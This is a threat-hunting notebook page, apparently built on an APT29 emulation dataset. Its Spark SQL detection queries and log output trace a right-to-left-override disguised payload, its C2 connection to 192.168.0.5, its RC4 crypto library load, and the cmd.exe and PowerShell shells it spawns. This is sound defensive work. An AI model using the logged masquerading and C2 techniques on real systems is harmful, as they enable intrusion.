<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 3</span>
<span class="sd">    AND LOWER(Image) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 02:55:59.631
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ProcessId: 8524
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59835
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.0.5
DestinationHostname: -
DestinationPort: 1234
DestinationPortName: - 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:1BAC5645-83CD-4D6F-A4F8-659084401F47</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 5156</span>
<span class="sd">  AND LOWER(Application) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8524
	Application Name:	\device\harddiskvolume2\programdata\victim\â€®cod.3aka3.scr

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.4
	Source Port:		59835
	Destination Address:	192.168.0.5
	Destination Port:		1234
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	68659
	Layer Name:		Connect
	Layer Run-Time ID:	48 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-4-standard-cryptographic-protocol">
<h2>1.A.4. Standard Cryptographic Protocol<a class="headerlink" href="#a-4-standard-cryptographic-protocol" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Used RC4 stream cipher to encrypt C2 (192.168.0.5) traffic</p>
<p><strong>Criteria:</strong> Evidence that the network data sent over the C2 channel is encrypted</p>
<div class="section" id="detection-type-none-none">
<h3>Detection Type:None(None)<a class="headerlink" href="#detection-type-none-none" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:E12B701E-1222-413C-BCAF-F357CB769B3E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND EventID = 7</span>
<span class="sd">  AND Image LIKE &quot;%3aka3%&quot;</span>
<span class="sd">  AND LOWER(ImageLoaded) LIKE &#39;%bcrypt.dll&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Image loaded:
RuleName: -
UtcTime: 2020-05-02 02:55:56.949
ProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ProcessId: 8524
Image: C:\ProgramData\victim\â€®cod.3aka3.scr
ImageLoaded: C:\Windows\System32\bcrypt.dll
FileVersion: 10.0.18362.267 (WinBuild.160101.0800)
Description: Windows Cryptographic Primitives Library
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bcrypt.dll
Hashes: SHA1=421C35E0949143DE72C8F98776565D24815AD47E,MD5=F46778029BE7D755EBDCDF048EA62A4B,SHA256=907A4D1D405283AD24BBA1F9A763C5118A33574F3E0EC7FC543F65B24CC0A748,IMPHASH=E5649DCD6FA9472DB9A89CCD123913C0
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-command-line-interface">
<h2>1.B.1. Command-Line Interface<a class="headerlink" href="#b-1-command-line-interface" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Spawned interactive cmd.exe</p>
<p><strong>Criteria:</strong> cmd.exe spawning from the rcs.3aka3.doc​ process</p>
<div class="section" id="detection-type-telemetry-correlated">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#detection-type-telemetry-correlated" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:4799C203-573A-49CB-ACE4-8C4C5CD3862A</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND EventID = 1</span>
<span class="sd">  AND LOWER(ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">  AND LOWER(Image) LIKE &quot;%cmd.exe&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:56:04.510
ProcessGuid: {47ab858c-e144-5eac-ab03-000000000400}
ProcessId: 2772
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.18362.449 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: &quot;C:\windows\system32\cmd.exe&quot;
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=8DCA9749CD48D286950E7A9FA1088C937CBCCAD4,MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ParentProcessId: 8524
ParentImage: C:\ProgramData\victim\â€®cod.3aka3.scr
ParentCommandLine: &quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S 
-RECORD 1--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:57:12.376
ProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
ProcessId: 3480
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.18362.449 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: &quot;C:\windows\system32\cmd.exe&quot;
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=8DCA9749CD48D286950E7A9FA1088C937CBCCAD4,MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {47ab858c-e13c-5eac-a903-000000000400}
ParentProcessId: 8524
ParentImage: C:\ProgramData\victim\â€®cod.3aka3.scr
ParentCommandLine: &quot;C:\ProgramData\victim\â€®cod.3aka3.scr&quot; /S 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:C8D664CD-48EE-4663-AE49-D5B0B19014C7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 4688</span>
<span class="sd">  AND LOWER(ParentProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">  AND LOWER(NewProcessName) LIKE &quot;%cmd.exe&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xad4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	&quot;C:\windows\system32\cmd.exe&quot;

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd98
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0x214c
	Creator Process Name:	C:\ProgramData\victim\â€®cod.3aka3.scr
	Process Command Line:	&quot;C:\windows\system32\cmd.exe&quot;

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-2-powershell">
<h2>1.B.2. PowerShell<a class="headerlink" href="#b-2-powershell" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Spawned interactive powershell.exe</p>
<p><strong>Criteria:</strong> powershell.exe spawning from cmd.exe</p>
<div class="section" id="id3">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:C1DBF5F2-21D5-45E4-8D9A-44905F1F8242</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">        AND LOWER(ParentImage) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">        AND LOWER(Image) LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(Image) LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:56:14.894
ProcessGuid: {47ab858c-e14e-5eac-ac03-000000000400}
ProcessId: 5944
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e144-5eac-ab03-000000000400}
ParentProcessId: 2772
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &quot;C:\windows\system32\cmd.exe&quot; 
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:57:15.946
ProcessGuid: {47ab858c-e18b-5eac-b103-000000000400}
ProcessId: 6868
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
ParentProcessId: 3480
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &quot;C:\windows\system32\cmd.exe&quot; 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:59:04.124
ProcessGuid: {47ab858c-e1f8-5eac-bc03-000000000400}
ProcessId: 3832
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell
CurrentDirectory: C:\ProgramData\victim\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-f331-370000000000}
LogonId: 0x3731F3
TerminalSessionId: 2
IntegrityLevel: Medium
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
ParentProcessId: 3480
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &quot;C:\windows\system32\cmd.exe&quot; 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:43B46661-3407-4302-BA8C-EE772C677DCB</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND LOWER(ParentProcessName) RLIKE &#39;.*\\â€Ž|â€|â€ª|â€«|â€¬|â€|â€®.*&#39;</span>
<span class="sd">        AND LOWER(NewProcessName) LIKE &#39;%cmd.exe&#39;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessId = b.NewProcessId</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">    AND EventID = 4688</span>
<span class="sd">    AND LOWER(NewProcessName) LIKE &#39;%powershell.exe&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1738
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xad4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
-RECORD 1----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ad4
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xd98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
-RECORD 2----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x3731F3

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xef8
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		S-1-16-8192
	Creator Process ID:	0xd98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.  
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="a-1-file-and-directory-discovery">
